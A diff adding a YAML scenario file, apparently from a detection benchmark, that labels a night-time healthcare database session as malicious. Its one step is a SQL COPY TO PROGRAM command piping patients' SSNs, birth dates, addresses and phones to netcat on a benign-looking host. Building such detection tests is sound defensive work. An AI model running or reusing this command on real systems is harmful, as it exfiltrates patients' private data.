@@ -1,0 +1,30 @@
+scenario_id: gen_healthcare_35_copy_to_program_mal_926m
+family_id: gen_healthcare_35_copy_to_program_fam_926
+domain: healthcare
+time_of_day: 02:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT ssn, date_of_birth, address, phone FROM patients) TO PROGRAM
+      'nc audit-intake.corp 443'
+    connects_to:
+      ip: 10.2.2.227
+      port: 22
+matched_pair_id: gen_healthcare_35_copy_to_program_pair_926
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
